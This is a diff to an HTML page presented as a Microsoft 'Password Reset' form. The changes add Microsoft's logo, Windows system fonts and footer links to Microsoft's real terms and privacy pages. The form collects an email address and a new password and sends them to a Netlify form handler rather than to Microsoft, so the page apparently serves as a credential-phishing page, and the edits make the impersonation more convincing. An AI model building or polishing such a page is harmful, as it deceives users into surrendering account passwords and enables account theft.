@@ -32,17 +32,18 @@
         .form-container {
             background: rgba(255, 255, 255, 0.9); /* Semi-transparent background */
             padding: 10px 20px;
-            border-radius: 10px;
+            border-radius: 0px;
             width: 90%;
             max-width: 400px;
-            text-align: center;
+            text-align: left;
             box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+			font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
         }
 
         .form-container img {
-            max-width: 20px; /* Logo size */
+            max-width: 100px; /* Logo size */
             margin-bottom: 20px;
-            margin-top: 10px;
+            margin-top: 20px;
         }
 
         .form-container input {
@@ -50,21 +51,31 @@
             padding: 10px;
             margin: 5px 0;
             border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
+            border-radius: 0px;
+            font-size: 12px;
         }
-
+    .legal-copy {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      color: #989696;
+      text-align: center;
+      padding: 10px 20px;
+      font-size: 10px;
+      z-index: 1000;
+    }
         /* Button styling */
         .form-container button {
             padding: 10px 15px;
-            margin: 5px 0;
+            margin: 10px 0;
             background-color: #00a1e1;
             color: white;
             border: none;
             border-radius: 0px;
             cursor: pointer;
             font-size: 14px;
-            text-align: right; /* Ensures the button aligns right */
+            text-align: center; /* Ensures the button aligns right */
+			width: 100%;
         }
 
         .form-container button:hover {
@@ -89,15 +100,18 @@
 
     <div class="background">
         <div class="form-container">
-            <img src="MS_Logo2.png" alt="Logo"> <!-- Replace with your logo -->
+			<img src="MS_Logo2.png" alt="Logo"><br> <!-- Replace with your logo -->
+			<p style="margin-bottom: 20px; font-size: 18px; font-weight: 500">Password Reset</p>
 <form name="password-reset" method="POST" data-netlify="true">
     <input type="email" placeholder="Your email" name="name" required/>
     <input type="password" placeholder="New password" name="new password" required/>
     <input type="password" placeholder="Reenter password" name="reenter password" required/>
-    <button type="submit">Submit</button>
+    <button type="submit" style="margin-bottom: 20px">Submit</button>
 </form>
         </div>
     </div>
-
+	<div class="legal-copy">
+		<a href="https://www.microsoft.com/en-ca/servicesagreement/default.aspx" style="color:#989696; text-decoration: none; font-weight: 600">Terms of use</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://go.microsoft.com/fwlink/?LinkID=521839" style="color:#989696; text-decoration: none; font-weight: 600">Privacy and cookies</a><br><p style="font-size: 9px; margin-top: 10px">Use private browsing if this is not your device. <a href="https://go.microsoft.com/fwlink/?LinkID=521839" style="color:#0E2D87; text-decoration: none">Learn more</a></p>
+  </div>	
 </body>
 </html>
